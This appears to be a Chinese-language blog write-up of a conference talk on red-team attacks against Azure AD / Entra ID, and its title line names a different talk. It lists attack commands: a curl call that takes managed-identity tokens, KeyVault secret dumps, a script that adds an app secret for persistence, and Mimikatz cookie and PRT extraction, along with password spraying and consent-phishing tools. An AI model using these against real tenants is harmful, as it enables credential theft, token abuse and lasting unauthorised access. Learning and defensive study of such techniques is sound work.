---
title: "CYBERSEC 2025 臺灣資安大會 「Operations Security (OPSEC) — 紅隊不被抓到的秘密！」 (Steven Meow)"
date: 2025-02-10
author: "CHW"
tags:
  - techtalks
description: "將深入探討 Active Directory 和 Azure Active Directory (Entra ID) 的核心差異，揭示 Azure, Entra ID 內所含的資安威脅。我們將以從紅隊角度出發，分析 Entra ID 的潛在風險，並以實例方式展現如何使用特定工具來執行 Enumerate 及 Exploitation, Exfiltration 手法..."
---

CYBERSEC 2024 臺灣資安大會 「AD 已經防不完了，怎麼還有個 Azure AD？」(Steven Meow)
===

# Table of Contents

[TOC]

# Conference Info
**Conference Title**: CYBERSEC 2024 臺灣資安大會\
**Date**: 2024.05.16\
**Location**: 臺北南港展覽二館 7F 701G

**Presentation Title**: AD 已經防不完了，怎麼還有個 Azure AD？\
**Speaker**: 游照臨 (Steven Meow) ｜ 趨勢科技 Threat Researcher, CoreTech Red Team\
**Description**:\
>在這場議程中，我們將深入探討 Active Directory 和 Azure Active Directory (Entra ID) 的核心差異，揭示 Azure, Entra ID 內所含的資安威脅。我們將以從紅隊角度出發，分析 Entra ID 的潛在風險，並以實例方式展現如何使用特定工具來執行 Enumerate 及 Exploitation, Exfiltration 手法，甚至是 Bypass 2FA 的攻擊方式。此外，我們也會詳述橫向移動的 Hybrid Identity 攻擊手法，包括從本地到雲端，甚至從雲端反打回本地 Active Directory 的技術，例如 Password Hash Sync, Pass-Through Authentication, AD Federation Golden SAML 等。

# Presentation Technical Content
>[!Note]
> 內容也包含自己不太懂，上網 research 的補充知識

![image](https://hackmd.io/_uploads/HkwVbP6Vkx.png)
![image](https://hackmd.io/_uploads/HJSubD64Jx.png)

> 當初聽這場演講時，對 AD 一竅不通。但認為 AD 是藍隊幾乎都會用到的服務，先聽藍隊的內容(雖然講者是 Red Team Threat Researcher)，對往後打 AD & AAD 應該會有幫助。

## Introduction to AAD 
>[!Note]
> **Microsoft Entra ID (先前稱為 Azure Active Directory):**\
> 微軟提供的雲端身份驗證和授權服務，用於管理使用者身份、訪問權限和企業資源的解決方案。它是Azure雲端平台的一部分，為企業提供了安全、可擴展和可信賴的身份管理功能。
Azure AD的主要功能包括身份驗證、單一登入（Single Sign-On，SSO）、多因素驗證（Multi-Factor Authentication，MFA）、應用程式管理和訪問控制等。透過Azure AD，企業可以集中管理使用者帳戶、組織架構和訪問策略，並將其應用到各種雲端和本地應用程式。 ([medium/Sean Chou](https://medium.com/chouhsiang/1-azure-ad%E7%B0%A1%E4%BB%8B-%E7%B0%A1%E5%96%AE%E5%85%A5%E9%96%80azure-ad-e769108ca18a))

![image](https://hackmd.io/_uploads/rJcHEwaNkg.png)
![image](https://hackmd.io/_uploads/rk6dEw6Vke.png)

/ | Azure AD (Entra ID) | Azure |
:------:|:---------------------:|:---------------------:|
定位  |    身分識別與存取管理解決方案    |    雲端平台   |
主要功能 |    使用者驗證、應用程式存取管理、多重驗證 (MFA)、SSO    |   虛擬機、儲存裝置、資料庫、AI 等服務 
使用範圍  |    身分識別和安全性管理    |    建置、部署及管理雲端應用程式和基礎設施 
主要元素  |   使用者、群組、應用程式註冊、條件式存取    |    虛擬機、Azure SQL、Blob Storage 等等  
重點功能   |   提供單一登入、多重驗證、條件式存取、密碼重設    |   全球資料中心、彈性擴展能力

![image](https://hackmd.io/_uploads/BkDLgc6N1e.png)

### Azure Role-Based Access Control (RBAC)
[Azure RBAC](https://learn.microsoft.com/en-us/azure/role-based-access-control/overview) 是一種用於管理 Azure 資源存取權的授權系統，基於 「最小權限原則」，只允許使用者取得工作所需最低權限，從而提升安全性並簡化存取管理。
![image](https://hackmd.io/_uploads/SyKS8opVyx.png)
1. 指派 User 角色
![image](https://hackmd.io/_uploads/B1qo8sTNJl.png)
2. 定義角色權限
![image](https://hackmd.io/_uploads/r1dALjaVJl.png)
3. 角色分配
將角色附加到特定範圍內的 user, group, service principal, or managed identity
![image](https://hackmd.io/_uploads/Hyq7PipN1e.png)

### Azure Attribute-Based Access Control (ABAC)
[Azure ABAC](https://learn.microsoft.com/zh-tw/azure/role-based-access-control/conditions-overview) 一種授權系統，可根據與安全性主體、資源和存取要求環境相關聯的屬性定義存取權。 使用 ABAC 可以根據屬性授與對資源的安全性主體存取權。
![image](https://hackmd.io/_uploads/Sy_09sTN1x.png)

功能 | RBAC | ABAC |
:------:|:---------------------:|:---------------------:|
授權  |    角色 (Role)    |    角色 + 屬性 (Attributes)   |
管理控制 |    基本角色控制    |   支援條件式控制，提供權限管理更細緻 
情境 |   管理整體角色存取    |    基於資源屬性或使用者屬性實現動態授權

ABAC 相較 RBAC 多了一層「條件式控制」，可以根據資源的屬性或請求的條件來設定更細緻的存取規則。

### **Azure / AAD 常用工具**
#### Azure AD PowerShell (最主要 Azure AD 工具)
- 開啟 PowerShell 安裝 Azure AD 模組
```PowerShell
Install-Module AzureAD.Standard.Preview
```
#### Azure Powershell (可存取 Azure 資源)
- 開啟 PowerShell 安裝 Azure PowerShell 模組
```PowerShell
Install-Module -Name Az -AllowClobber -Scope CurrentUser
```
#### [Az Cli](https://learn.microsoft.com/zh-tw/cli/azure/install-azure-cli) (跨平台，可支援Bash)
#### [Hacker Tool] [AAD Internals](https://aadinternals.com/aadinternals/)
- 列出 Azure AD user、驗證 user 密碼、PasswordSpray
- 開啟 PowerShell 安裝 AAD Internals
```PowerShell
Install-Module -Name AADInternals -Force
```
#### [Hacker Tool] [MicroBrust](https://github.com/NetSPI/MicroBurst)
- 列出 Azure Resource Groups
- 檢查 Azure Storage Keys
- 列出角色指派與權限
- 掃描未使用的 Subdomain 

## Enumeration 

### Tenant
通常對應於一個公司或組織的 Azure 雲端環境。 Unique Identifier (Tenant ID)
![image](https://hackmd.io/_uploads/HyppF1yBJx.png)
    - Tenant Enumeration
    公開可訪問 Azure AD 端點或功能
    ![image](https://hackmd.io/_uploads/Hy--iykS1x.png)

         - Tenant ID
         - 租戶名稱（domain）
         - 公開的 user 或 group
         - Application 端點

### Brute-Force / Password Spraying
- [MSOL Spary](https://github.com/dafthack/MSOLSpray)
用於 Microsoft Online Services (MSOL) 帳號密碼
    - 針對 Azure AD / Microsoft 365 帳號 Password Spraying
    - 支援 PowerShell Module
- Evasion
    - 更換 IP / VPN / Proxy

### Authenticated Enumeration
當取得帳號與密碼後，利用該帳號連接到 Azure AD 或 Azure 環境
- Connect-AzureAD (AAD Module)
	- Get-AzureADUser –SearchString "admin" 
	搜尋與 “admin” 相關的使用者帳號
	- Get-AzureADGroup
	列出所有Group
	- Get-AzureADGroupMember
	取得特定Group, 例：
    ```powershell
    Connect-AzureAD

    $groups=Get-AzureADGroup -All $true
    ForEach ($group in $groups){
        $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true  
            Write-output $members
        }
    ```
    > 1. `Connect-AzureAD`: 連接到 Azure AD Tenant
    > 2. `Get-AzureADGroup -All $true`: 如上解釋，取得所有 Azure AD group
    > 3. `ForEach`: 遞迴取得成員
    > 4. `$members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All`: 取得指定群組
    > > `-ObjectId $group.ObjectId`：目標Group的唯一識別碼\
    > > `-All $true`：強制列出該群組所有成員。
    >
    > 5. `Write-Output $members`: 輸出
    
- Connect-AzAccount (Azure Module) 
	- Connect-AzAccount
	登入取得權限
    - Get-AzResource
	列出所有 Azure 資源
	- Get-AzADGroup
	列出 Azure AD 群組資訊
 - az login (Az cli)
 基於 CLI 的 Azure 管理方式
	- az login
    登入取得權限
    - az user list
    列出所有 Azure AD user account
	- az ad group list
    列出 Azure AD Tenant 中的所有群組資訊

### Enumerate Tools
#### [Road Tool](https://github.com/dirkjanm/ROADtools)
主要用於探測、枚舉 和 分析 Azure AD tenant的資訊
- ROADrecon: Enumeration AD tenant
- ROADlib: library can be used to authenticate with Azure AD 
> 分析 Azure AD Graph API

#### [Storm Spotter](https://reconshell.com/stormspotter-azure-red-team-tool-for-graphing-azure-and-azure-active-directory-objects/)
![image](https://hackmd.io/_uploads/SkIEUeJSye.png)
> 視覺化 Azure 資源、網路結構、使用者、RBAC 權限

#### [Azure Hound](https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html#)
![image](https://hackmd.io/_uploads/SJ2Xueyr1g.png)

## Exploitation 
### Consent and Permission
- User permissions request
![image](https://hackmd.io/_uploads/BkSuigyBJe.png)
- Register APP & API permission
![image](https://hackmd.io/_uploads/ByXXnxkryl.png)
- [O365 Stealer](https://github.com/AlteredSecurity/365-Stealer)
偽裝的應用程式要求使用者授權，使用釣魚或惡意 applicatiion
    - CLI (python3)
    - Web UI
![image](https://hackmd.io/_uploads/rkKMaeySkx.png)

### Managed Identity(APP Service Account)
- Azure 中的 Managed Identity 大約等於 Service Account
- RCE APP 可以從 env 中取得相關資訊
    - IDENTITY_ENDPOINT=http://localhost:8081/msi/token
    - IDENTITY_HEADER=5C5AF712699F422792244A14D4DC8CB9   
- 只要針對 Endpoint 使用 curl 帶 Header 就可以取得 access token
    - `curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER`
    - `curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER`

- 拿到 Access Token 不需要 2FA 驗證的功能
    - Azure PowerShell
    - Azure AD PowerShell 
    - Az Cli
    - MS Graph API
    - ARM

## Lateral Movement 
透過已取得的憑證、腳本或漏洞，橫向到其他系統以達成最終目標
###  Azure Automation Account
- 觀察 Run Book 
Run Book 中的 log、script、credential 等資訊，找到暴露的資訊
Goal：提取憑證、API keys 或管理者權限 Credential Harvesting
- Payload 塞入 Hybrid Runbook
Hybrid Runbook Worker 是在受控的本機上執行 reverse shell 或 腳本的代理程式。
Goal：取得本機 RCE 權限

### VM Instance run command
`AZVMRunCommand` & `Set-AzVMExtenstion`
![image](https://hackmd.io/_uploads/Hy21gWxHJg.png)

### Microsoft Intune (Endpoint Manager) Deploy Script
Microsoft Intune 是雲端端點管理解決方案，屬於 Microsoft Endpoint Manager 組合中的一部分，主要用來管理企業的裝置、應用程式和安全性設定。
![image](https://hackmd.io/_uploads/rkWTiZeHJg.png)

## Exfiltration & Persistent
竊取資料 (Exfiltration) 並在系統中長期存取權限 (Persistence)
- KeyVault
![image](https://hackmd.io/_uploads/BJPXaZxrkl.png)
> `Get-AzKeyVaultSecret -VaultName AAAAA`: 獲取 KeyVault AAAAA 中的所有 Secrets 資料\
> `Enabled`: 是否啟用此 Secret\
> 接著往下查 `Get-AzKeyVaultSecret -VaultName AAAAA -Name BBBBBB -AsPlainText`: 指定 Secret (BBBBBB) 的內容，並以純文字顯示

- Blob
Blob Storage 是 Azure 提供的雲端儲存服務，儲存大量非結構化資料
![image](https://hackmd.io/_uploads/B1QeJzeS1x.png)

- APP Notes
這裡指的是各種 Applications Properties 中的 Notes
![image](https://hackmd.io/_uploads/rydnkGeS1g.png)

- Persistent - Add Enterprise Application Secret
```script
import-module .'Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $GraphToken -Verbos

$passwd = ConvertTo-SecureString "SECRET" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("SERVICE-OBJECT-ID",Spassw)
Connect-AzAccount -ServicePrincipal -Credential Screds -TenantID "TENANT-ID"
```
> 1. `import-module .'Add-AzADAppSecret.ps1'`: 自定義的 Module，用來新增 Azure AD Secret 用
> 2. `Add-AzADAppSecret -GraphToken $GraphToken -Verbose`: 使用 Graph API Token 新增 Secret
> 3. `$passwd = ConvertTo-SecureString "SECRET" -AsPlainText -Force`: 明文密碼強制轉成 SecureString (PowerShell 預設不接受明文)
> 4. `$creds = New-Object System.Management.Automation.PSCredential ("SERVICE-OBJECT-ID", $passwd)`: 建立一個新的物件
> > `System.Management.Automation.PSCredentia`: 儲存 SERVICE-OBJECT-ID 與 SecureString密碼

## Cloud ←→ On Premise
### On-Premise to Cloud - Pass the Cookie: Mimikatz
>[!Note] 
>[Mimikatz](https://github.com/ParrotSec/mimikatz): Windows 安全工具\
由 Benjamin Delpy 開發的開源安全工具，用於測試和展示 Windows 作業系統的安全漏洞，尤其是與身份驗證、憑證存儲和密碼管理相關的弱點。

Pass the Cookie :針對 Web 應用認證機制的攻擊方式，透過竊取來的連線cookie去驗證，繞過傳統登錄機制。 (案例：[iThome](https://www.ithome.com.tw/news/142230))
```Mimikatz
mimikatz # privilege::debug
Privilege '20' OK
```
> `privilege::debug`: 提權命令

```Mimikatz
mimikatz # dpapi::chrome /in:2localapodata&)google)chrome(USERDA-1defaulticookies /unprotect
Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
* using CryptUnprotectData API
>AES Key is: 6ecbf26057751a9f9ea127676183531d3ee3abb0a1b766829797a7fbb1cbbd98f94d
```
> `dpapi::chrome`: 用來解密 Google Chrome 中的 Cookies 檔案\
>> `/in`: 指定瀏覽器的 Cookie 檔案路徑\
>> `/unprotect`: 調用 Windows DPAPI (CryptUnprotectData) 解密 AES 密鑰\
>> Windows Data Protection API (DPAPI) 是 Microsoft 提供的一種加密機制
>
> AES Key 成功解密 DPAPI 後可以取得 Cookies 資料。

Cookie 結構：
```Mimikatz
Host : .bing.com ( / )
Name : MUID
Dates:1/2/2/2024 7:24:49 AM -> 1/26/2025 7:24:49 AM
using BCrypt with AES-256-GCM
Cookie: 20390F3E887E62642BD71CC48C7E64E6

Host :login.microsoftonline.com ( )
Name : ESTSAUTHLIGHT
Dates : 1/4/2024 4:37:20 AM
using BCrypt with AES-256-GCM
Cookie: +6cb6c7c6-067e-4f2f-8657-0175ff5e1304+3ebafa15-52a1-4c9a-bceb-ec821e486204

Host : login.microsoftonline.com ( )
Name : ESTSSSOTILES
Dates:12/21/2023 7:14:38 PM -> 1/1/2034 7:00:38 PM
using BCrypt with AES-256-GCM
Cookie: 1

Host : login.microsoftonline.com ( )
Name : MSFPC
Dates : 12/24/2023 10:56:10 PM -> 12/23/2024 10:56:10 PM
using BCrypt with AES-256-GCM
Cookie: GUID-12e2efe96c4c4800983d3d91c313be24c&HASH=12e2&LV-262312&V=4&LU-1782824884828323
```
> Host：Cookie 所屬的 domain name
Name：Cookie 名稱 (如 MUID)\
Dates：有效期限\
加密演算法：BCrypt with AES-256-GCM\
Cookie 值： 可用於認證

### On-Premise to Cloud - Pass the PRT: Mimikatz
>[!Note]
>PRT (Primary Refresh Token\
>A Primary Refresh Token (PRT) is a key artifact of Microsoft Entra authentication on Windows 10 or newer. It's a JSON Web Token (JWT) specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. \
>Azure Active Directory (AAD) 認證的特殊 Token，負責幫助應用程式在使用者登入後自動更新 Access Token，從而實現單一登入 (SSO)\
>(Ref: [Microsoft Entra Document](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token))

- Mimikatz
    -  從 LSASS 提取 PRT 和 Encrypted Session Key
    `sekurlsa::cloudap`
    -  利用 DPAPI Master Key 解密 Session Key（ProofOfPossessionKey）
    `dpapi::cloudapkd /keyvalue:[ProofOfPosessionKey] /unprotect`
    -  生成新的 PRT cookie (利用 PRT, Derived key and Context)
    `dpapi::cloudapkd /context:[Context] /derivedkey:[DerivedKey] /Prt:[PRT]`
    -  注入新的 PRT 到瀏覽器的 cookie 欄位
    `Name:x-ms-RefreshTokenCredential`

### Hybrid Identity
- 大多數的Organization 同時雲端跟地端都有Resource
- 所以會希望把 Cloud 的 AAD 跟 On-Prem 的 AD 進行整合
- 常見手法有以下三種
    - Password Hash Sync (PHS
        - 預設每 2 分鐘 Sync 一次到雲端
        - 本地 AD 會自動建立 MSOL_xxxx 帳號 
            - 帳號具有 DCSync 權限 + Generic Write 所有 User + Password Never Expired)
        - AAD 會建立一個 Sync_xxxx_xxxx 帳號
            - 帳號可以修改 AAD 上所有由地端 Sync 上去的密碼
        - 所有明文密碼都存在 Connect Server 􏰋 localdb (MSSQL) 
    - Pass-Through Authentication (PTA)
        - 在地端 AD 安裝一台 Connector、 Agent
        - (所有驗證都會把明文帳密從雲端送到地端驗證)
        - ![image](https://hackmd.io/_uploads/SJkZk_gBkg.png)
    
    ![image](https://hackmd.io/_uploads/BkEm1ueSyx.png)

    - Federation (ADFS)
        - Federation Trust
            - 本地建立 AD FS Server，與雲端(AAD/O365..) 建立互相 trust
            - 使用 Security Assertion Markup Language (SAML) 溝通
        - User / Client
        - Identity Provider (IdP): Ex. ADFS Server 
        - Service Provider (SP): Ex. AAD
    
    ![image](https://hackmd.io/_uploads/BkrylOerkg.png)

# Summary
![image](https://hackmd.io/_uploads/ryXfe_gSye.png)



